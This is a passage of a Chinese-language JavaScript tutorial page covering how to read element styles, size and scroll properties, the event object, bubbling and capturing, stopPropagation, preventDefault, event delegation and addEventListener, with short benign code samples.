class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>读取元素样式</p><ul><li>语法：元素.style.样式名</li><li>通过style属性设置和读取的都是内联样式，无法读取样式表中的样式</li></ul></li></ul><h3 id="读取元素样式"><a href="#读取元素样式" class="headerlink" title="读取元素样式"></a>读取元素样式</h3><ul><li>currentStyle<ul><li>语法：元素.currentStyle.样式名</li><li>可以用来读取当前元素正在显示的样式，如果当前元素没有设置该样式，则获取它的默认值</li><li>currentStyle只有IE浏览器支持，其他的浏览器都不支持</li></ul></li><li>getComputedStyle()<ul><li>获取元素当前的样式，这个方法是window的方法，可以直接使用</li><li>两个参数<ul><li>第一个：要获取样式的元素</li><li>第二个：可以传递一个伪元素，一般都传null</li></ul></li><li>该方法会返回一个对象，对象中封装了当前元素对应的样式，可以通过对象.样式名来读取样式</li><li>如果获取的样式没有设置，则会获取到真实的值，而不是默认值，比如：没有设置width，它不会获取到auto，而是一个长度</li><li>该方法不支持IE8及以下的浏览器</li><li>通过currentStyle和getComputedStyle()读取到的样式都是只读的，不能修改，如果要修改必须通过style属性<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取box1的宽度</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title function_">getComputedStyle</span>(box1,<span class="literal">null</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getComputedStyle</span>(box1,<span class="literal">null</span>).<span class="property">width</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getComputedStyle</span>(box1,<span class="literal">null</span>).<span class="property">backgroundColor</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> w = <span class="title function_">getStyle</span>(box1,<span class="string">&quot;width&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getStyle</span>(<span class="params">obj , name</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">getComputedStyle</span>)&#123;</span><br><span class="line">    <span class="comment">//正常浏览器的方式，具有getComputedStyle()方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getComputedStyle</span>(obj , <span class="literal">null</span>)[name];</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//IE8的方式，没有getComputedStyle()方法</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">currentStyle</span>[name];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//return window.getComputedStyle?getComputedStyle(obj , null)[name]:obj.currentStyle[name];</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="其他样式操作属性"><a href="#其他样式操作属性" class="headerlink" title="其他样式操作属性"></a>其他样式操作属性</h3><ul><li>clientWidth、clientHeight<ul><li>这两个属性可以获取元素的可见宽度和高度</li><li>这些属性都是不带px的，返回都是一个数字，可以直接进行计算</li><li>会获取元素宽度和高度，包括内容区和内边距</li><li>这些属性都是只读的，不能修改<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(box1.<span class="property">clientWidth</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>offsetWidth、offsetHeight<ul><li>获取元素的整个的宽度和高度，包括内容区、内边距和边框<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(box1.<span class="property">offsetWidth</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>offsetParent<ul><li>可以用来获取当前元素的定位父元素</li><li>会获取到离当前元素最近的开启了定位的祖先元素（position不是static）, 如果所有的祖先元素都没有开启定位，则返回body<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> op = box1.<span class="property">offsetParent</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(op.<span class="property">id</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>offsetLeft<ul><li>当前元素相对于其定位父元素的水平偏移量</li></ul></li><li>offsetTop<ul><li>当前元素相对于其定位父元素的垂直偏移量</li></ul></li><li>scrollWidth、scrollHeight<ul><li>可以获取元素整个滚动区域的宽度和高度</li></ul></li><li>scrollLeft<ul><li>可以获取水平滚动条滚动的距离</li></ul></li><li>scrollTop<ul><li>可以获取垂直滚动条滚动的距离</li></ul></li><li>scrollHeight - scrollTop == clientHeight<ul><li>说明垂直滚动条滚动到底了</li></ul></li><li>scrollWidth - scrollLeft == clientWidth<ul><li>说明水平滚动条滚动到底</li></ul></li><li>onscroll<ul><li>该事件会在元素的滚动条滚动时触发<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> info = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">info.<span class="property">onscroll</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h2><h3 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h3><ul><li>事件对象<ul><li>当事件的响应函数被触发时，浏览器每次都会将一个事件对象作为实参传递进响应函数,</li><li>在事件对象中封装了当前事件相关的一切信息，比如：鼠标的坐标  键盘哪个按键被按下  鼠标滚轮滚动的方向…</li></ul></li><li>onmousemove<ul><li>该事件将会在鼠标在元素中移动时被触发<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当鼠标在areaDiv中移动时，在showMsg中来显示鼠标的坐标</span></span><br><span class="line"><span class="keyword">var</span> areaDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;areaDiv&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> showMsg = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;showMsg&quot;</span>);</span><br><span class="line">areaDiv.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 在IE8中，响应函数被触发时，浏览器不会传递事件对象，</span></span><br><span class="line"><span class="comment">   * 在IE8及以下的浏览器中，是将事件对象作为window对象的属性保存的</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="comment">/*if(!event)&#123;</span></span><br><span class="line"><span class="comment">      event = window.event;</span></span><br><span class="line"><span class="comment">  &#125;*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//解决事件对象的兼容性问题</span></span><br><span class="line">  event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * clientX可以获取鼠标指针的水平坐标</span></span><br><span class="line"><span class="comment">   * cilentY可以获取鼠标指针的垂直坐标</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">var</span> x = event.<span class="property">clientX</span>;</span><br><span class="line">  <span class="keyword">var</span> y = event.<span class="property">clientY</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//alert(&quot;x = &quot;+x + &quot; , y = &quot;+y);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//在showMsg中显示鼠标的坐标</span></span><br><span class="line">  showMsg.<span class="property">innerHTML</span> = <span class="string">&quot;x = &quot;</span>+x + <span class="string">&quot; , y = &quot;</span>+y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li><li>clientX、clientY<ul><li>用于获取鼠标在当前的可见窗口的坐标</li></ul></li><li>pageX、pageY<ul><li>可以获取鼠标相对于当前页面的坐标<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使div可以跟随鼠标移动</span></span><br><span class="line"><span class="comment">//获取box1</span></span><br><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line"><span class="comment">//绑定鼠标移动事件</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  <span class="comment">//解决兼容问题</span></span><br><span class="line">  event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取滚动条滚动的距离</span></span><br><span class="line">  <span class="keyword">var</span> st = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span>;</span><br><span class="line">  <span class="keyword">var</span> sl = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollLeft</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollLeft</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> left = event.<span class="property">clientX</span>;</span><br><span class="line">  <span class="keyword">var</span>　top = event.<span class="property">clientY</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置div的偏移量</span></span><br><span class="line">  box1.<span class="property">style</span>.<span class="property">left</span> = left + sl + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">  box1.<span class="property">style</span>.<span class="property">top</span> = top + st + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移动时box2中不可以进入</span></span><br><span class="line"><span class="keyword">var</span> box2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box2&quot;</span>);</span><br><span class="line">box2.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line"></span><br><span class="line">  event.<span class="property">cancelBubble</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="冒泡"><a href="#冒泡" class="headerlink" title="冒泡"></a>冒泡</h2><ul><li>事件的冒泡（Bubble）<ul><li>所谓的冒泡指的就是事件的向上传导，当后代元素上的事件被触发时，其祖先元素的相同事件也会被触发</li><li>在开发中大部分情况冒泡都是有用的,如果不希望发生事件冒泡可以通过事件对象来取消冒泡<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为s1绑定一个单击响应函数</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;s1&quot;</span>);</span><br><span class="line">s1.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;我是span的单击响应函数&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//取消冒泡</span></span><br><span class="line">  <span class="comment">//可以将事件对象的cancelBubble设置为true，即可取消冒泡</span></span><br><span class="line">  <span class="comment">//影响box1</span></span><br><span class="line">  event.<span class="property">cancelBubble</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为box1绑定一个单击响应函数</span></span><br><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line">box1.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;我是div的单击响应函数&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//影响body</span></span><br><span class="line">  event.<span class="property">cancelBubble</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为body绑定一个单击响应函数</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;我是body的单击响应函数&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="事件冒泡与事件捕获"><a href="#事件冒泡与事件捕获" class="headerlink" title="事件冒泡与事件捕获"></a>事件冒泡与事件捕获</h2><p><img src="/images/%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E4%B8%8E%E6%8D%95%E8%8E%B7.gif" alt="Image text"><br>提示：下面提到的<code>目标节点</code>指的是<code>触发事件的节点</code></p><h3 id="事件捕获"><a href="#事件捕获" class="headerlink" title="事件捕获"></a>事件捕获</h3><ul><li>由微软公司提出，事件从文档根节点（Document 对象）流向目标节点，途中会经过目标节点的各个父级节点，并在这些节点上触发捕获事件，直至到达事件的目标节点</li><li>在事件捕获阶段，事件会从 DOM 树的最外层开始，依次经过目标节点的各个父节点，并触发父节点上的事件，直至到达事件的目标节点。以上图中的代码为例，如果单击其中<a>标签，则该事件将通过document-&gt;div-&gt;p-&gt;a的顺序传递到<a>标签</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--单击最内层的&lt;a&gt;标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span>DIV</span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;hint&quot;</span>&gt;</span>P</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>A<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">showTagName</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;事件捕获: &quot;</span> + <span class="variable language_">this</span>.<span class="property">tagName</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> elems = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;div, p, a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">for</span> (<span class="keyword">let</span> elem <span class="keyword">of</span> elems) &#123;</span></span><br><span class="line"><span class="language-javascript">    elem.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, showTagName, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E4%BA%8B%E4%BB%B6%E6%8D%95%E8%8E%B7%E6%BC%94%E7%A4%BA%E5%9B%BE.gif" alt="Image text"></p><h3 id="事件冒泡"><a href="#事件冒泡" class="headerlink" title="事件冒泡"></a>事件冒泡</h3><ul><li>由网景公司提出，与事件捕获相反，事件会从目标节点流向文档根节点，途中会经过目标节点的各个父级节点，并在这些节点上触发捕获事件，直至到达文档的根节点。整个过程就像水中的气泡一样，从水底向上运动<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--单击最内层的&lt;a&gt;标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;事件冒泡: &#x27; + this.tagName)&quot;</span>&gt;</span>DIV</span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;事件冒泡: &#x27; + this.tagName)&quot;</span>&gt;</span>P</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;事件冒泡: &#x27; + this.tagName)&quot;</span>&gt;</span>A<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/images/%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E6%BC%94%E7%A4%BA%E5%9B%BE.gif" alt="Image text"></li></ul><h3 id="阻止事件捕获和冒泡"><a href="#阻止事件捕获和冒泡" class="headerlink" title="阻止事件捕获和冒泡"></a>阻止事件捕获和冒泡</h3><ul><li>stopPropagation() 方法来阻止事件捕获和事件冒泡的发生</li><li>stopPropagation() 会阻止事件捕获和事件冒泡，但是无法阻止标签的默认行为，例如点击链接任然可以打开对应网页<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span>DIV</span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;hint&quot;</span>&gt;</span>P</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>A<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">showAlert</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;您点击了 &quot;</span>+ <span class="variable language_">this</span>.<span class="property">tagName</span> + <span class="string">&quot; 标签&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            event.<span class="title function_">stopPropagation</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> elems = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;div, p, a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(<span class="keyword">let</span> elem <span class="keyword">of</span> elems) &#123;</span></span><br><span class="line"><span class="language-javascript">            elem.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, showAlert);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>stopImmediatePropagation()方法来阻止同一节点的同一事件的其它事件处理程序，例如为某个节点定义了多个点击事件，当事件触发时，这些事件会按定义顺序依次执行，如果其中一个事件处理程序中使用了 stopImmediatePropagation() 方法，那么剩下的事件处理程序将不再执行。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;您点击了 &#x27; + this.tagName + &#x27; 标签&#x27;)&quot;</span>&gt;</span>DIV</span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;您点击了 &#x27; + this.tagName + &#x27; 标签&#x27;)&quot;</span>&gt;</span>P</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;link&quot;</span>&gt;</span>A<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;事件处理程序 1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            event.<span class="title function_">stopImmediatePropagation</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;事件处理程序 2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 为 id 为 link 的标签定义多个点击事件</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;link&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        link.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, sayHi); </span></span><br><span class="line"><span class="language-javascript">        link.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, sayHello);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="阻止默认操作"><a href="#阻止默认操作" class="headerlink" title="阻止默认操作"></a>阻止默认操作</h3><ul><li>event.preventDefault();</li><li> event.returnValue = false; IE9 及以下的浏览器<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://c.biancheng.net/&quot;</span> <span class="attr">id</span>=<span class="string">&quot;link&quot;</span>&gt;</span>链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;link&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        link.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            event.<span class="title function_">preventDefault</span>(); <span class="comment">// 阻止链接跳转</span></span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="事件委派"><a href="#事件委派" class="headerlink" title="事件委派"></a>事件委派</h2><ul><li>事件的委派<ul><li>指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素，从而通过祖先元素的响应函数来处理事件。</li><li>事件委派是利用了冒泡，通过委派可以减少事件绑定的次数，提高程序的性能<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只绑定一次事件，即可应用到多个的元素上，即使元素是后添加的</span></span><br><span class="line"><span class="comment">// 可以尝试将其绑定给元素的共同的祖先元素</span></span><br><span class="line"><span class="comment">// 为ul绑定一个单击响应函数</span></span><br><span class="line">&lt;ul id=<span class="string">&quot;u1&quot;</span> style=<span class="string">&quot;background-color: #bfa;&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是p元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span>&gt;</span>超链接一<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span>&gt;</span>超链接二<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span>&gt;</span>超链接三<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> u1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;u1&quot;</span>);</span><br><span class="line">u1.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * target</span></span><br><span class="line"><span class="comment">   * - event中的target表示的触发事件的对象</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="comment">//alert(event.target);</span></span><br><span class="line">  <span class="comment">//如果触发事件的对象是我们期望的元素，则执行否则不执行</span></span><br><span class="line">  <span class="keyword">if</span>(event.<span class="property">target</span>.<span class="property">className</span> == <span class="string">&quot;link&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是ul的单击响应函数&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h2><ul><li><p>语法：元素对象.事件 = 函数的形式绑定响应函数，</p></li><li><p>只能同时为一个元素的一个事件绑定一个响应函数，不能绑定多个，如果绑定了多个，则后边会覆盖掉前边的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为btn01绑定一个单击响应函数</span></span><br><span class="line">btn01.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为btn01绑定第二个响应函数</span></span><br><span class="line">btn01.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">2</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>addEventListener()</p><ul><li>通过这个方法也可以为元素绑定响应函数</li><li>参数：<ul><li>1.事件的字符串，不要on</li><li>2.回调函数，当事件触发时该函数会被调用</li><li>3.是否在捕获阶段触发事件，需要一个布尔值，一般都传false</li></ul></li><li>使用addEventListener()可以同时为一个元素的相同事件同时绑定多个响应函数，这样当事件被触发时，响应函数将会按照函数的<code>绑定顺序执行</code></li><li>这个方法不支持IE8及以下的浏览器<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btn01.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">1</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">btn01.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">2</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">btn01.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span 